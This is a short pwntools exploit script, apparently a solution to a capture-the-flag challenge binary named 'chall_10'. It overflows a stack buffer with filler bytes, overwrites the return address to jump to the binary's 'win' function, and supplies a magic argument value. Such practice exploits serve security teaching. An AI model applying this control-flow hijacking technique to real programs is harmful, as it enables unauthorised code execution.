from pwn import *

# Set the context to the binary file
binary = context.binary = ELF('./chall_10')

# Start the process
p = process(binary.path)

# Receive and discard the first line of output from the process
p.recvline()

# Create the payload
payload = b''

# Fill with 'A' characters to reach the return address
payload += 0x30c * b'A'

# Overwrite the return address with the address of the win function
payload += p32(binary.sym.win)

# Add 3 additional 4-byte values (0x0, 0x0, 0x1a55fac3) to pad the payload
payload += p32(0)
payload += p32(0)
payload += p32(0x1a55fac3)

# Send the payload to the process
p.sendline(payload)